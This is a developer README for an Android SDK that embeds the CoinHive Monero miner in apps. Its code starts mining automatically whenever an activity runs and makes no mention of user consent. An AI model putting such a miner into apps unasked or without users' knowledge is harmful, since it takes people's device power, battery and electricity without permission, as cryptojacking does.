# CoinHive Android SDK

Simply saying, CoinHive is a cypto miner. The Coinhive JavaScript Miner lets you embed a Monero miner directly into your website. but there wasn't any solution for android, to mine Monero from apps. So i developed one. :)

### Installation

Install the dependency.

```groovy
compile 'com.theah64.coinhive:coinhive:1.0.6'
```

Init in your application

```java
public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();

        CoinHive.getInstance()
                .init("YOUR-SITE-KEY") // mandatory
                .setNumberOfThreads(4) // optional
                .setIsAutoThread(true) // optional
                .setThrottle(0.2) // optional
                .setLoggingEnabled(true) // To logcat mining status, false by default.
                .setIsForceASMJS(false); // optional

    }
}

```

Finally, extend your activities from `BaseCoinHiveActivity`

```java
public class MainActivity extends BaseCoinHiveActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        
        //Usual stuff
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        

    }

}
```
Done. Mining will start once you start the activity and will continue untill the activity get destroyed.

### Miner status

If the miner runs actively, `onRunning()` method will get called on each second.

You can override the `onMiningStarted()` and `onMiningStopped()` to get miner status.

```java
public class MainActivity extends BaseCoinHiveActivity {
    
    ...
    
    @Override
    public void onRunning(double hashesPerSecond, long totalHashes, long acceptedHashes) {

    }

    @Override
    private void onMiningStarted() {

    }
    
    @Override
    private void onMiningStopped() {

    }

}
```

### Miner controls

To stop the miner, you can call `stopMining()`.

To star the miner, you can call `startMining()`.

NOTE:By default, miner will start automatically.


### Issue or Improvements

Shoot me a mail to theapache64@gmail.com :)

